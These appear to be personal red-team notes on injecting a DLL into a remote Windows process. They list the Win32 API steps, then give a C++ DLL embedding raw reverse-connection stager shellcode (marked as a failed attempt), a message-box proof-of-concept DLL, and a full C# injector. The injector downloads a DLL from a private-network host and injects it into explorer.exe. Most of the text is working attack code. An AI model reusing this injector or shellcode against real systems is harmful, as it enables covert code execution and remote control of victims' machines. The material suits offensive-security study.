# inject an entire DLL into a remote process instead of just shellcode.  
<br><br><br>

Steps:

OpenProcess — obtain a handle to the target process.

VirtualAllocEx — allocate memory in the target process.

WriteProcessMemory — write full path to the DLL into allocated memory.

GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA") — locate function address.

CreateRemoteThread — execute LoadLibraryA with the path as argument.



### LoadLibraryA ProtoType
*Many Win32 APIs come in two variants, with a suffix of "A" or "W". In this instance, it would be LoadLibraryA or LoadLibraryW and describes if any string arguments are to be given as ASCII ("A") or Unicode ("W"), but otherwise signify the same functionality.*  
<br><br>

```C
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);

```

<br><br><br>


## This requires a unmnagedDLL file to execute code. 

** was only able to get this working with messagebox.  I was unable to get shellcode to execute **

``` c

// this is a failed attempt at making a cpp DLL file to inject shellcode.  Will return

// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>

__declspec(dllexport)
void customcode() {

    std::cout << "Should be shellcoding!";

    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49\x01\xd0\x8b"
        "\x48\x18\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
        "\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
        "\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
        "\x77\x26\x07\xff\xd5\x53\x53\xe8\x82\x00\x00\x00\x4d\x6f"
        "\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e"
        "\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20"
        "\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70"
        "\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e"
        "\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b"
        "\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d"
        "\x65\x2f\x31\x33\x31\x2e\x30\x2e\x30\x2e\x30\x20\x53\x61"
        "\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x20\x45\x64"
        "\x67\x2f\x31\x33\x31\x2e\x30\x2e\x32\x39\x30\x33\x2e\x38"
        "\x36\x00\x59\x53\x5a\x4d\x31\xc0\x4d\x31\xc9\x53\x53\x49"
        "\xba\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5\xe8\x0e\x00"
        "\x00\x00\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x39"
        "\x36\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xfc\x20\x00\x00\x4d"
        "\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f\xc6\x00"
        "\x00\x00\x00\xff\xd5\xe8\x57\x00\x00\x00\x2f\x31\x37\x55"
        "\x6e\x61\x38\x4a\x47\x41\x6b\x6d\x6b\x6c\x71\x57\x55\x7a"
        "\x41\x71\x31\x64\x67\x64\x39\x72\x7a\x4f\x66\x36\x52\x7a"
        "\x75\x42\x4c\x5f\x69\x59\x51\x51\x4f\x53\x73\x35\x59\x39"
        "\x48\x68\x5f\x50\x41\x31\x5f\x75\x4e\x64\x4f\x66\x7a\x36"
        "\x55\x76\x6f\x32\x49\x55\x64\x30\x4b\x6b\x73\x78\x38\x6d"
        "\x36\x76\x48\x75\x70\x73\x71\x51\x2d\x71\x6d\x37\x00\x48"
        "\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00\x32"
        "\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55"
        "\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x6a"
        "\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04\x41"
        "\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x4d"
        "\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9\x53"
        "\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1f"
        "\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0\x00"
        "\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8\x55"
        "\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10"
        "\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00"
        "\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89"
        "\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9"
        "\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83"
        "\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85\xc0"
        "\x75\xd2\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41"
        "\x89\xda\xff\xd5";
    //24228
    HANDLE PHandle = OpenProcess(0x0002, false, 7148);
    LPVOID addr = VirtualAllocEx(PHandle, (LPVOID)NULL, sizeof(buf), 0x3000, 0x40);
    SIZE_T* memoryOut = 0;
    BOOL Memorysuccess = WriteProcessMemory(PHandle, addr, buf, sizeof(buf), memoryOut);
    

    std::cout << addr;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )


{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        customcode();
        break;
    case DLL_THREAD_ATTACH:
        customcode();
        break;
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```


## Good DLL file for loading messagebox POC


``` c

#include <windows.h>
#pragma comment(lib, "user32.lib")

__declspec(dllexport) void HelloFromDLL() {
    MessageBoxA(NULL, "Hello from the DLL!", "DLL Message", MB_OK);
}

// Required entry point for DLLs
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {

	case DLL_THREAD_ATTACH:
            HelloFromDLL();  // Call when injected
            break;
        case DLL_PROCESS_ATTACH:
            HelloFromDLL();  // Call when injected
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

```


<br>

```c#

using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;

namespace DLL_Injection_with_csharp
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetExitCodeThread(IntPtr hThread, out IntPtr lpExitCode);

        static void Main(string[] args)
        {
            var filename = "test" + Random.Shared.NextInt64(10000).ToString() + ".dll";
            string dllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), filename);

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.1.196:4443/test.dll", dllPath);

            Process[] processes = Process.GetProcessesByName("explorer");
            if (processes.Length == 0)
            {
                Console.WriteLine("Target process not found.");
                return;
            }

            int pid = processes[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine($"OpenProcess failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            // Convert the DLL path to a null-terminated ASCII string
            byte[] dllBytes = Encoding.ASCII.GetBytes(dllPath + "\0");

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllBytes.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine($"VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            bool writeSuccess = WriteProcessMemory(hProcess, addr, dllBytes, dllBytes.Length, out IntPtr bytesWritten);
            if (!writeSuccess)
            {
                Console.WriteLine($"WriteProcessMemory failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLibraryAddr == IntPtr.Zero)
            {
                Console.WriteLine($"GetProcAddress failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, addr, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine($"CreateRemoteThread failed: {Marshal.GetLastWin32Error()}");
                return;
            }

            WaitForSingleObject(hThread, 5000); // Wait for thread to finish

            if (GetExitCodeThread(hThread, out IntPtr exitCode))
            {
                Console.WriteLine($"Remote thread exit code (DLL load addr): 0x{exitCode.ToInt64():X}");
                if (exitCode == IntPtr.Zero)
                {
                    Console.WriteLine("DLL failed to load.");
                }
                else
                {
                    Console.WriteLine("DLL injection successful.");
                }
            }
            else
            {
                Console.WriteLine($"GetExitCodeThread failed: {Marshal.GetLastWin32Error()}");
            }
        }
    }
}



```
